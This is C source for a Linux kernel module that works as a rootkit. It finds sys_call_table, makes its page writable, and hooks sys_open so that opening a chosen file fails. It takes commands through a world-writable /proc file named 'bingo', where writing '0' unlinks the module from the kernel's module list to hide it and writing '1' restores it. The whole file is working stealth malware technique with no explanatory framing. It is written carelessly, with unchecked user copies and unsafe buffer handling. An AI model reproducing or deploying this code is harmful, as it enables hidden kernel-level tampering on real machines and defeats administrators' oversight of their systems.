#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");

char filepath[128] = { 0x0, } ;
void ** sctable ;
int count = 0 ;
struct list_head *prev;

static void hide(void) {
	printk("hide\n");
	prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

static void show(void) {
	printk("show\n");
	list_add(&THIS_MODULE->list, prev);
}
asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 

asmlinkage int openhook_sys_open(const char __user * filename, int flags, umode_t mode)
{
	char fname[256] ;
	
	copy_from_user(fname, filename, 256) ;

	if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
		count+=2 ;
		return -1 ;
	}
	return orig_sys_open(filename, flags, mode) ;
}


static 
int openhook_proc_open(struct inode *inode, struct file *file) {
	return 0 ;
}

static 
int openhook_proc_release(struct inode *inode, struct file *file) {
	return 0 ;
}

static
ssize_t openhook_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
{
	char buf[256] ;
	ssize_t toread ;

	//sprintf(buf, "%s:%d\n", filepath, count) ;
	sprintf(buf, "%s\n", filepath) ;

	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;

	if (copy_to_user(ubuf, buf + *offset, toread))
		return -EFAULT ;	

	*offset = *offset + toread ;

	return toread ;
}

static 
ssize_t openhook_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
{
	char buf[128] = {0x0, } ;

	if (*offset != 0 || size > 128)
		return -EFAULT ;

	if (copy_from_user(buf, ubuf, size))
		return -EFAULT ;
	
	printk("buf : %s\n", buf);
	sscanf(buf,"%s", filepath);
	printk("filepath : %s\n", filepath);
	if (strcmp(filepath, "0") == 0) {
		printk("filepath is 0, go to hide\n");
		hide();
	}
	else if (strcmp(filepath, "1") == 0) {
		printk("filepath is 1, go to show\n");
		show();
	}
	count = 0 ;
	*offset = strlen(buf) ;

	return *offset ;
}

static const struct file_operations openhook_fops = {
	.owner = 	THIS_MODULE,
	.open = 	openhook_proc_open,
	.read = 	openhook_proc_read,
	.write = 	openhook_proc_write,
	.llseek = 	seq_lseek,
	.release = 	openhook_proc_release,
} ;

static 
int __init openhook_init(void) {
	unsigned int level ; 
	pte_t * pte ;

	proc_create("bingo", S_IRUGO | S_IWUGO, NULL, &openhook_fops) ;

	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;

	orig_sys_open = sctable[__NR_open] ;
	pte = lookup_address((unsigned long) sctable, &level) ;
	if (pte->pte &~ _PAGE_RW) 
		pte->pte |= _PAGE_RW ;		
	sctable[__NR_open] = openhook_sys_open ;
	
	return 0;
}

static 
void __exit openhook_exit(void) {
	unsigned int level ;
	pte_t * pte ;
	remove_proc_entry("bingo", NULL) ;

	sctable[__NR_open] = orig_sys_open ;
	pte = lookup_address((unsigned long) sctable, &level) ;
	pte->pte = pte->pte &~ _PAGE_RW ;
}

module_init(openhook_init);
module_exit(openhook_exit);
